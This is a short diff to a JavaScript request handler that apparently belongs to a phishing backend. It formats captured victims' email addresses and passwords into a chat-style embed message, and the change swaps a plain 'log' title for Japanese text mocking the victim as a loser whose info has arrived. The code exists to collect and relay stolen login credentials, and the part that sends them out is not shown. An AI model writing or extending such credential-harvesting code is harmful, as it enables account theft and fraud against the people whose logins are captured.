@@ -48,8 +48,8 @@ export default async function handler(req, res) {
     const payload = {
       embeds: [
         {
-          title: "ログ",
-          description: `メアド: ${cleanXdss}\n\nパスワード: ${cleanWans}`,
+          title: "で、でたーwwwwwww",
+          description: `雑魚の情報はこちら\n\nメアド: ${cleanXdss}\n\nパスワード: ${cleanWans}`,
           color: 3447003,
           timestamp: new Date().toISOString()
         }
